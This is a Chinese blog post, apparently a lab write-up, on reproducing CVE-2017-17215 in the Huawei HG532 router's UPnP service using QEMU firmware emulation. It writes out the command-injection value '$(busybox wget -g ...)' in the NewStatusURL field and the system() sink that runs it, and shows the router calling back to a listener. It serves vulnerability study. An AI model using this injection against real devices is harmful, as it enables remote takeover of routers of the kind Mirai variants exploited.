# 通过 CVE-2017-17215 学习路由器漏洞分析，从入坑到放弃 - h2z - 博客园

> 原文：[`www.cnblogs.com/h2zZhou/p/8606995.html`](https://www.cnblogs.com/h2zZhou/p/8606995.html)

## 1.基本信息：

2017/11/27，Check Point 软件技术部门报告了一个华为 HG532 产品的远程命令执行漏洞(CVE-2017-17215)，Mirai 的升级版变种中[已经使用该漏洞](https://research.checkpoint.com/good-zero-day-skiddie/)。看起来是个很简单的漏洞了，书上得来终觉浅，须知此事要躬行，复现和分析的过程中遇到很多坑，写文记录一下详细步骤。

华为已经发了漏洞公告，固件已经升级到 HG532eV100R001C02B017_upgrade_main.bin。从论坛里找到了带漏洞版本件，HG532eV100R001C02B015_upgrade_main.bin。

分析环境是 ubuntu 16.04.

先用 binwalk 解压一下：

![通过 CVE-2017-17215 学习路由器漏洞分析](http://image.3001.net/images/20180111/15156578161354.png)

根据 Check Point 的报告，漏洞点位于 UPnP 服务中,file 命令看一下,可以看到 upnp 应该是跑在 MIPS 32 位 大端架构系统

![通过 CVE-2017-17215 学习路由器漏洞分析](http://image.3001.net/images/20180111/15156580805951.png)

## 2.配置复现环境：

安装 qemu：

sudo apt-get install qemu

sudo apt-get install qemu-user-static

sudo apt-get install qemu-system

安装网络配置工具：

```
apt-get install bridge-utils uml-utilities
```

修改 ubuntu 主机网络配置，将 ubuntu 主机系统中的网络接口配置文件 /etc/network/interfaces 修改为如下内容：

![通过 CVE-2017-17215 学习路由器漏洞分析](http://image.3001.net/images/20180111/15156587081163.png)

创建 QEMU 的网络接口启动脚本（/etc/qemu-ifup）并保存为如下内容：

![通过 CVE-2017-17215 学习路由器漏洞分析](http://image.3001.net/images/20180111/1515658972939.png)

赋予文件/etc/qemu-ifup 可执行权限：

```
sudo chmod a+x /etc/qemu-ifup 
```

重启网络使所有的配置生效：

```
sudo /etc/init.d/networking restart
```

关闭 ens33，启动桥连网络 br0

sudo ifdown eth0  

sudo ifup br0

从[`people.debian.org/`](https://people.debian.org/)~aurel32/qemu/mips/下载对应的 debian mips qemu 镜像

![通过 CVE-2017-17215 学习路由器漏洞分析](http://image.3001.net/images/20180111/15156592945471.png)

其他的帖子里有各种下载 qemu 镜像的地址，试了几个下载都不好用，各种坑

我下载的是 debian_squeeze_mips_standard.qcow2 和 vmlinux-2.6.32-5-4kc-malta。

启动 qemu 运行刚镜像：

```
sudo qemu-system-mips -M malta -kernel vmlinux-2.6.32-5-4kc-malta -hda debian_squeeze_mips_standard.qcow2 -append "root=/dev/sda1 console=tty0" -net nic,macaddr=00:16:3e:00:00:01 -net tap
```

好的，假如一切顺利，可以看到一个 qemu 虚拟机，用 root/root 登录进去:

![通过 CVE-2017-17215 学习路由器漏洞分析](http://image.3001.net/images/20180111/1515660657639.png)

发现网络不通，ifconfig -a 看一下发现网络接口为 eth1：

![通过 CVE-2017-17215 学习路由器漏洞分析](http://image.3001.net/images/20180111/15156609745022.png)

将 nano /etc/network/interfaces 文件中的 eth0 改为 eth1：

![通过 CVE-2017-17215 学习路由器漏洞分析](http://image.3001.net/images/20180111/15156613687279.png)

再用 ifup eth1  将 eth1 启起来，运气好的话此时网络已经好了。

直接操作虚拟机显然比较麻烦，在 ubuntu 上搞个 SSH 连进来，ssh root@虚拟机 ip

将之前解压的固件包拷贝到虚拟机里面：

scp -r ./squashfs-root  root@虚拟机 ip:/root/

完成搭建路由器固件运行的环境。

## 3.复现漏洞：

第一个问题是怎么让路由器里的服务启起来，我们也不知道是哪个文件会去处理 80 端口过来的请求，先看下 checkpoint 报告里的 payload

![通过 CVE-2017-17215 学习路由器漏洞分析](http://image.3001.net/images/20180112/15157197169485.png)

在固件文件夹下搜一下 ctrlt 和 DeviceUpgrade_1，并没有文件名含有这 2 个词语，再搜下包含这 2 个词语的文件：

![通过 CVE-2017-17215 学习路由器漏洞分析](http://image.3001.net/images/20180111/15156659813673.png)

找到固件所在的位置，想直接执行下 upnp 这个文件，报错,缺少相应的 so 文件造成。

![图片.png](http://image.3001.net/images/20180111/15156686001122.png)

chroot /root/squashfs-root /bin/sh 来切换根目录到路由器文件系统，执行成功：

![通过 CVE-2017-17215 学习路由器漏洞分析](http://image.3001.net/images/20180111/15156685477408.png) 
可是发包过去仍然失败，应该是并没有启动监听服务

那找下端口 37215

![通过 CVE-2017-17215 学习路由器漏洞分析](http://image.3001.net/images/20180111/15156662004916.png)

端口号只出现在 mic 文件内，看下文件内容：

![通过 CVE-2017-17215 学习路由器漏洞分析](http://image.3001.net/images/20180111/15156663101284.png)

看字符串像是一个跟网络服务相关的文件，试下运行一下：

![通过 CVE-2017-17215 学习路由器漏洞分析](http://image.3001.net/images/20180111/15156664767325.png)

看起来像是对了，

ubuntu 上 nc -vlp 80 监听一下端口，跑一下 exp，80 端口收到路由器发来的 wget 请求包。

![通过 CVE-2017-17215 学习路由器漏洞分析](http://image.3001.net/images/20180111/15156682779054.png)

4.简单分析：

分析一下 upnp 中的关键代码:

![通过 CVE-2017-17215 学习路由器漏洞分析](http://image.3001.net/images/20180112/15157334268937.png)

根据上面 payload 图，newstatusurl 这个节点值为 <NewStatusURL>$(busybox wget -g xxxx ;xx;xx)</NewStatusURL>

```
snprintf(a0,0x400,"upg -g -U %s -t '1 Firmware Upgrade Image' -c upnp -r %s -d -",a3)
```

其中 a0 是拷贝的源字符串的地址，同时 a0 又是 system 调用的第一个参数。所以最后会执行

```
system（a0）
```

如果看完整篇文章想上手试一下路由器漏洞的话，不要忘了当初你是为什么放弃的.